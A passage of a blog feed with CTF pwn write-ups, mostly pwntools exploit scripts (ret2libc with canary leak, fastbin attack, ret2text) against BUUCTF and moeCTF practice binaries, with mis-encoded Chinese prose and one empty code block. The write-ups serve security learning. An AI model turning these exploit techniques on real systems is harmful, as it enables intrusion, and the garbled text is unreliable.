class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2020/12/04/GmnYAjS7r6DUbpC.png" alt="image.png"></p><h1 id="0x02E-bjdctf-2020-babyrop2-fmtstr-ret2libc"><a href="#0x02E-bjdctf-2020-babyrop2-fmtstr-ret2libc" class="headerlink" title="0x02E.bjdctf_2020_babyrop2 - fmtstr + ret2libc"></a>0x02E.bjdctf_2020_babyrop2 - fmtstr + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p><p><img src="https://i.loli.net/2020/12/04/uH6V1kLP3M5TizI.png" alt="image.png"></p><p>åœ¨giftå‡½æ•°ä¸­å¯ä»¥æ³„éœ²canary</p><p><img src="https://i.loli.net/2020/12/04/K7psfAMFocnalTy.png" alt="image.png"></p><p>åœ¨vulnä¸­ç›´æ¥å°±æœ‰ä¸€ä¸ªæº¢å‡º</p><p><img src="https://i.loli.net/2020/12/04/XHYVtGCxol92dNE.png" alt="image.png"></p><p>é‚£ä¹ˆå…ˆæ³„éœ²canaryå†ret2libcå³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 26028)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x20</span> - <span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/12/04/rScmVH2X87ob5iB.png" alt="image.png"></p><h1 id="0x02F-jarvisoj-test-your-memory-ret2text"><a href="#0x02F-jarvisoj-test-your-memory-ret2text" class="headerlink" title="0x02F.jarvisoj_test_your_memory - ret2text"></a>0x02F.jarvisoj_test_your_memory - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/04/RuA5Pk3QrJqXKHd.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/04/IefOqdQ4E6yBMKZ.png" alt="image.png"></p><p>å­˜åœ¨æº¢å‡º</p><p><img src="https://i.loli.net/2020/12/04/gXN7KSE3T4dzLob.png" alt="image.png"></p><p>å­˜åœ¨systemå‡½æ•°</p><p><img src="https://i.loli.net/2020/12/04/l7ST1q2FcrGWbUM.png" alt="image.png"></p><p>å­˜åœ¨ä¸€ä¸ª<code>cat flag</code>å­—ç¬¦ä¸²</p><p>é‚£ç›´æ¥system(â€œcat flagâ€)å°±è¡Œäº†</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/12/04/uZlcnrhgJo23zpW.png" alt="image.png"></p><blockquote><p>æ³¨ï¼šè¿™é“é¢˜å¾ˆå‘ï¼Œé¢˜ç›®ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶å¤§ç›¸å¾„åº­ï¼Œæ‰€ä»¥æ²¡èƒ½get shellâ€¦</p></blockquote><h1 id="0x30-ZJCTF-2019-Login"><a href="#0x30-ZJCTF-2019-Login" class="headerlink" title="0x30.[ZJCTF 2019]Login -"></a>0x30.[ZJCTF 2019]Login -</h1><h1 id="0x-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x???.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x???.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</h1><p>å‡ºç°é‡å¤çš„é¢˜æ˜¯çœŸçš„ç¦»è°±</p><p>è¿‡ç¨‹è§å‰é¢0x013ï¼Œè¿™é‡Œå°±ä¸å†èµ˜å™äº†</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/19/kJSyCIWmsLdoaOD.png" alt="image.png"></p><h1 id="0x-mrctf2020-easyrop-ret2text"><a href="#0x-mrctf2020-easyrop-ret2text" class="headerlink" title="0x???.mrctf2020_easyrop - ret2text"></a>0x???.mrctf2020_easyrop - ret2text</h1><blockquote><p>ä»æ¯”è¾ƒé åçš„æ— äººåŒºæŒ‘äº†ä¸€é“ç®€å•é¢˜æ¥åš2333ï¼ˆ<del>ä¸ºäº†æ··åˆ†</del></p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/10/07/9iQUjlYXTmzAKoB.png" alt="image.png"></p><p>ä¸»å‡½æ•°ä¸­æ ¹æ®æˆ‘ä»¬æ‰€è¾“å…¥çš„æ•°å­—è¿›å…¥ä¸åŒçš„å‡½æ•°ï¼Œè¾“å…¥7åˆ™åœ¨è¿›å…¥ç›¸åº”çš„å‡½æ•°ä¹‹åé€€å‡º</p><p><img src="https://i.loli.net/2020/10/07/zrNR46ytfJ2gcDq.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨èƒ½å¤Ÿç›´æ¥getshellçš„gadget</p><p><img src="https://i.loli.net/2020/10/07/LXQr9f2BShwG1bC.png" alt="image.png"></p><p>è™½ç„¶è¯´å‡ ä¸ªå‡½æ•°éƒ½æ˜¯å‘mainä¸­çš„v5ä¸Šå†™å…¥ï¼Œä½†æ˜¯æœ€å¤§çš„ä¸€ä¸ªå‡½æ•°ä»…å¯ä»¥å†™å…¥<code>0x300</code>å­—èŠ‚ï¼Œæº¢å‡ºåˆ°rbpè¦<code>0x310</code>å­—èŠ‚</p><p><img src="https://i.loli.net/2020/10/07/wzrb1uSvc49oaeO.png" alt="image.png"></p><p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨<code>byby()</code>å‡½æ•°ä¸­ç¨‹åºä¼šå°†v5çœ‹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶åœ¨å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹è¯»å…¥ç”¨æˆ·è¾“å…¥</p><p><img src="https://i.loli.net/2020/10/07/QDHPlT9WFS3gx6K.png" alt="image.png"></p><p>ç”±äº<code>hehe()</code>èƒ½å¤Ÿè¯»å…¥0x300å­—èŠ‚ï¼Œæ•…æˆ‘ä»¬è€ƒè™‘å…ˆä½¿ç”¨<code>hehe()</code>å‡½æ•°æ„é€ ä¸€ä¸ªé•¿åº¦ä¸º0x2ffçš„å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨<code>byby()</code>å‡½æ•°è¿›è¡Œè¯»å…¥ï¼Œä¾¿å¯ä»¥æº¢å‡ºæ§åˆ¶ä¸»å‡½æ•°çš„è¿”å›åœ°å€è¿”å›è‡³<code>system(&quot;/bin/sh&quot;)</code></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29482</span>)<span class="comment">#process(&#x27;./mrctf2020_easyrop&#x27;)#</span></span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x300</span>-<span class="number">1</span>)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x11</span>+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x40072a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¾—flag</p><p><img src="https://i.loli.net/2020/10/07/TwVOht7dcnsZzbN.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x000-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x000-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x000.ç»ªè®º&quot;&gt;&lt;/a&gt;0x000.ç»ªè®º&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;buuoj.cn&quot;&gt;BUUCTF&lt;/a&gt;æ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜&lt;/p&gt;
&lt;p&gt;æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆ&lt;del&gt;å“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦&lt;/del&gt;ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆ&lt;del&gt;å¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;Baby Pwneråšçš„éƒ½æ˜¯pwné¢˜ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨ï¼šæˆ‘ä¼šåœ¨é¢˜ç›®çš„æ—è¾¹å†™ä¸Šè€ƒç‚¹&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ret2text" scheme="http://archive.next.arttnba3.cn/tags/ret2text/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="å †" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="ROP" scheme="http://archive.next.arttnba3.cn/tags/ROP/"/>
    
    <category term="æ ˆè¿ç§»" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="Integer Overflow" scheme="http://archive.next.arttnba3.cn/tags/Integer-Overflow/"/>
    
    <category term="Fastbin Attack" scheme="http://archive.next.arttnba3.cn/tags/Fastbin-Attack/"/>
    
    <category term="one_gadget" scheme="http://archive.next.arttnba3.cn/tags/one-gadget/"/>
    
    <category term="ret2csu" scheme="http://archive.next.arttnba3.cn/tags/ret2csu/"/>
    
    <category term="ret2libc" scheme="http://archive.next.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="Unsorted bin Attack" scheme="http://archive.next.arttnba3.cn/tags/Unsorted-bin-Attack/"/>
    
    <category term="SROP" scheme="http://archive.next.arttnba3.cn/tags/SROP/"/>
    
    <category term="canary" scheme="http://archive.next.arttnba3.cn/tags/canary/"/>
    
    <category term="gotè¡¨åŠ«æŒ" scheme="http://archive.next.arttnba3.cn/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x03ã€‘moeCTF2020-partial official write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/</id>
    <published>2020-09-06T20:44:37.000Z</published>
    <updated>2021-01-22T14:32:54.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>å¾ˆè£å¹¸èƒ½å’ŒRXå¤§å“¥ä»¥åŠè¯¸ä½å¸¦å¸ˆå‚…å…±åŒå‡ºäº†moeCTF2020çš„é¢˜ç›®ï¼Œä¹Ÿå¸Œæœ›åšé¢˜çš„å„ä½èƒ½å¤Ÿè·å¾—å¿«ä¹XD</p><p>é—²è¯ä¸å¤šè¯´ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡</p><blockquote><p>æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½</p></blockquote><span id="more"></span><h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="Pwnä»å…¥é—¨åˆ°å…¥ç‹±"><a href="#Pwnä»å…¥é—¨åˆ°å…¥ç‹±" class="headerlink" title="Pwnä»å…¥é—¨åˆ°å…¥ç‹±"></a>Pwnä»å…¥é—¨åˆ°å…¥ç‹±</h2><blockquote><p>æ³¨ï¼š0åŸºç¡€æ–°äººè¿˜è¯·ä»”ç»†é˜…è¯»<a href="https://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/">è¿™ä¸€ä»½æ–‡ä»¶</a></p></blockquote><p>åœ¨æ–‡ä»¶æœ«å°¾å¯ä»¥çœ‹åˆ°ç™½ç»™çš„flag</p><p><img src="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>ncï¼Œæç¤º<code>Please fill me up</code>ï¼Œè€ƒè™‘åˆ°æ ˆæº¢å‡ºï¼Œç›´æ¥è¾“å‡ºä¸€é•¿ä¸²éšæœºå­—ç¬¦ä¸²è·å¾—flag</p><p><img src="https://i.loli.net/2020/08/01/frusiYZlnD39J4U.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;W3lc0m3_t0_tH3_w0r1d_0f_PWN!&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Pwn-ret2text"><a href="#Baby-Pwn-ret2text" class="headerlink" title="Baby Pwn - ret2text"></a>Baby Pwn - ret2text</h2><p> <a href="/download/moectf2020/pwn/baby_pwn/pwn1%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-pwn1</a> </p><p>åœ¨IDAé‡Œæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹å¾—åˆ°å­˜åœ¨å­—ç¬¦ä¸²æº¢å‡ºæ¼æ´</p><p><img src="https://i.loli.net/2020/08/01/beydF6oiDAhQf4H.png" alt="image.png"></p><p>åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨<code>.text</code>æ®µå­˜åœ¨å¯ä»¥è¢«åˆ©ç”¨çš„<code>backdoor()</code>å‡½æ•°ï¼Œæ˜“çŸ¥è¯¥é¢˜å¯é€šè¿‡æ ˆæº¢å‡ºè¦†å†™è¿”å›åœ°å€è‡³<code>backdoor()</code>å‡½æ•°ä»¥getshellï¼Œæ˜¯ä¸ºä¸€é“å¾ˆç»å…¸çš„ret2text</p><p><img src="https://i.loli.net/2020/08/01/gDxUeytZdFS7Ph5.png" alt="image.png"></p><p>ç›¸å¯¹äºrbpçš„åç§»é‡ä¸º0x40+8 &#x3D; 72</p><p><img src="https://i.loli.net/2020/08/06/DqfQil7cmT6xIrS.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/X3YgIDKSVhWRJm5.png" alt="image.png"></p><p>æ•…æ„é€ å¦‚ä¸‹payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;pwn1&#x27;</span>)<span class="comment">#p = remote(&#x27;sec.eqqie.cn&#x27;,10003)</span></span><br><span class="line">pl = <span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> + p64(<span class="number">0x400676</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/01/JplCRSkxYLyEDKO.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;a0e65c41-fe8a-4db9-a070-f6593a5858c3&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Shellcode-shellcode"><a href="#Baby-Shellcode-shellcode" class="headerlink" title="Baby Shellcode - shellcode"></a>Baby Shellcode - shellcode</h2><p> <a 